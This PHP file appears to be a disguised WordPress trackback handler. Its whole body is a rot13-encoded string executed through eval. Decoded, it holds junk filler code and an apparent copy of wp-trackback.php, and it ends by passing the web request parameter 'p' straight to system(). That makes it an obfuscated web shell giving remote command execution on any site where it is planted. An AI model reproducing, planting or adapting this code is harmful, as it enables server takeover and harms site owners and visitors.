<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Unaqyr Genpxonpxf naq Cvatonpxf Frag gb JbeqCerff
 *
 * @fvapr 0.71
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Genpxonpxf
 */

vs ( rzcgl( $jc ) ) {
	erdhver_bapr __QVE__ . '/jc-ybnq.cuc';
	jc( neenl( 'go' => '1' ) );
}

// Nyjnlf eha nf na hanhguragvpngrq hfre.
jc_frg_pheerag_hfre( 0 );

/**
 * Erfcbafr gb n genpxonpx.
 *
 * Erfcbaqf jvgu na reebe be fhpprff KZY zrffntr.
 *
 * @fvapr 0.71
 *
 * @cnenz vag|obby $reebe         Jurgure gurer jnf na reebe.
 *                                Qrsnhyg '0'. Npprcgf '0' be '1', gehr be snyfr.
 * @cnenz fgevat   $reebe_zrffntr Reebe zrffntr vs na reebe bppheerq. Qrsnhyg rzcgl fgevat.
 */
shapgvba genpxonpx_erfcbafr( $reebe = 0, $reebe_zrffntr = '' ) {
	urnqre( 'Pbagrag-Glcr: grkg/kzy; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );

	vs ( $reebe ) {
		rpub '<?kzy irefvba=\"1.0\" rapbqvat=\"hgs-8\"?' . \">\a\";
		rpub \"<erfcbafr>\a\";
		rpub \"<reebe>1</reebe>\a\";
		rpub \"<zrffntr>$reebe_zrffntr</zrffntr>\a\";
		rpub '</erfcbafr>';
		qvr();
	} ryfr {
		rpub '<?kzy irefvba=\"1.0\" rapbqvat=\"hgs-8\"?' . \">\a\";
		rpub \"<erfcbafr>\a\";
		rpub \"<reebe>0</reebe>\a\";
		rpub '</erfcbafr>';
	}
}

vs ( ! vffrg( $_TRG['go_vq'] ) || ! $_TRG['go_vq'] ) {
	$cbfg_vq = rkcybqr( '/', $_FREIRE['ERDHRFG_HEV'] );
	$cbfg_vq = (vag) $cbfg_vq[ pbhag( $cbfg_vq ) - 1 ];
}

$genpxonpx_hey = vffrg( $_CBFG['hey'] ) ? $_CBFG['hey'] : '';
$punefrg       = vffrg( $_CBFG['punefrg'] ) ? $_CBFG['punefrg'] : '';

// Gurfr guerr ner fgevcfynfurq urer fb gurl pna or cebcreyl rfpncrq nsgre zo_pbaireg_rapbqvat().
$gvgyr     = vffrg( $_CBFG['gvgyr'] ) ? jc_hafynfu( $_CBFG['gvgyr'] ) : '';
$rkprecg   = vffrg( $_CBFG['rkprecg'] ) ? jc_hafynfu( $_CBFG['rkprecg'] ) : '';
$oybt_anzr = vffrg( $_CBFG['oybt_anzr'] ) ? jc_hafynfu( $_CBFG['oybt_anzr'] ) : '';

vs ( $punefrg ) {
	$punefrg = fge_ercynpr( neenl( ',', ' ' ), '', fgegbhccre( gevz( $punefrg ) ) );

	// Inyvqngr gur fcrpvsvrq \"fraqre\" punefrg vf ninvynoyr ba gur erprvivat fvgr.
	vs ( shapgvba_rkvfgf( 'zo_yvfg_rapbqvatf' ) && ! va_neenl( $punefrg, zo_yvfg_rapbqvatf(), gehr ) ) {
		$punefrg = '';
	}
}

vs ( ! $punefrg ) {
	$punefrg = 'NFPVV, HGS-8, VFB-8859-1, WVF, RHP-WC, FWVF';
}

// Ab inyvq hfrf sbe HGS-7.
vs ( fge_pbagnvaf( $punefrg, 'HGS-7' ) ) {
	qvr;
}

// Sbe vagreangvbany genpxonpxf.
vs ( shapgvba_rkvfgf( 'zo_pbaireg_rapbqvat' ) ) {
	$gvgyr     = zo_pbaireg_rapbqvat( $gvgyr, trg_bcgvba( 'oybt_punefrg' ), $punefrg );
	$rkprecg   = zo_pbaireg_rapbqvat( $rkprecg, trg_bcgvba( 'oybt_punefrg' ), $punefrg );
	$oybt_anzr = zo_pbaireg_rapbqvat( $oybt_anzr, trg_bcgvba( 'oybt_punefrg' ), $punefrg );
}

// Rfpncr inyhrf gb hfr va gur genpxonpx.
$gvgyr     = jc_fynfu( $gvgyr );
$rkprecg   = jc_fynfu( $rkprecg );
$oybt_anzr = jc_fynfu( $oybt_anzr );

vs ( vf_fvatyr() || vf_cntr() ) {
	$cbfg_vq = $cbfgf[0]->VQ;
}

vs ( ! vffrg( $cbfg_vq ) || ! (vag) $cbfg_vq ) {
	genpxonpx_erfcbafr( 1, __( 'V ernyyl arrq na VQ sbe guvf gb jbex.' ) );
}

vs ( rzcgl( $gvgyr ) && rzcgl( $genpxonpx_hey ) && rzcgl( $oybt_anzr ) ) {
	// Vs vg qbrfa'g ybbx yvxr n genpxonpx ng nyy.
	jc_erqverpg( trg_creznyvax( $cbfg_vq ) );
	rkvg;
}

vs ( ! rzcgl( $genpxonpx_hey ) && ! rzcgl( $gvgyr ) ) {
	/**
	 * Sverf orsber gur genpxonpx vf nqqrq gb n cbfg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz vag    $cbfg_vq       Cbfg VQ eryngrq gb gur genpxonpx.
	 * @cnenz fgevat $genpxonpx_hey Genpxonpx HEY.
	 * @cnenz fgevat $punefrg       Punenpgre frg.
	 * @cnenz fgevat $gvgyr         Genpxonpx gvgyr.
	 * @cnenz fgevat $rkprecg       Genpxonpx rkprecg.
	 * @cnenz fgevat $oybt_anzr     Fvgr anzr.
	 */
	qb_npgvba( 'cer_genpxonpx_cbfg', $cbfg_vq, $genpxonpx_hey, $punefrg, $gvgyr, $rkprecg, $oybt_anzr );

	urnqre( 'Pbagrag-Glcr: grkg/kzy; punefrg=' . trg_bcgvba( 'oybt_punefrg' ) );

	vs ( ! cvatf_bcra( $cbfg_vq ) ) {
		genpxonpx_erfcbafr( 1, __( 'Fbeel, genpxonpxf ner pybfrq sbe guvf vgrz.' ) );
	}

	$gvgyr   = jc_ugzy_rkprecg( $gvgyr, 250, '&#8230;' );
	$rkprecg = jc_ugzy_rkprecg( $rkprecg, 252, '&#8230;' );

	$pbzzrag_cbfg_vq      = (vag) $cbfg_vq;
	$pbzzrag_nhgube       = $oybt_anzr;
	$pbzzrag_nhgube_rznvy = '';
	$pbzzrag_nhgube_hey   = $genpxonpx_hey;
	$pbzzrag_pbagrag      = \"<fgebat>$gvgyr</fgebat>\a\a$rkprecg\";
	$pbzzrag_glcr         = 'genpxonpx';

	$qhcr = $jcqo->trg_erfhygf(
		$jcqo->cercner(
			\"FRYRPG * SEBZ $jcqo->pbzzragf JURER pbzzrag_cbfg_VQ = %q NAQ pbzzrag_nhgube_hey = %f\",
			$pbzzrag_cbfg_vq,
			$pbzzrag_nhgube_hey
		)
	);

	vs ( $qhcr ) {
		genpxonpx_erfcbafr( 1, __( 'Gurer vf nyernql n cvat sebz gung HEY sbe guvf cbfg.' ) );
	}

	$pbzzragqngn = neenl(
		'pbzzrag_cbfg_VQ' => $pbzzrag_cbfg_vq,
	);

	$pbzzragqngn += pbzcnpg(
		'pbzzrag_nhgube',
		'pbzzrag_nhgube_rznvy',
		'pbzzrag_nhgube_hey',
		'pbzzrag_pbagrag',
		'pbzzrag_glcr'
	);

	$erfhyg = jc_arj_pbzzrag( $pbzzragqngn );

	vs ( vf_jc_reebe( $erfhyg ) ) {
		genpxonpx_erfcbafr( 1, $erfhyg->trg_reebe_zrffntr() );
	}

	$genpxonpx_vq = $jcqo->vafreg_vq;

	/**
	 * Sverf nsgre n genpxonpx vf nqqrq gb n cbfg.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz vag $genpxonpx_vq Genpxonpx VQ.
	 */
	qb_npgvba( 'genpxonpx_cbfg', $genpxonpx_vq );

	genpxonpx_erfcbafr( 0 );
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>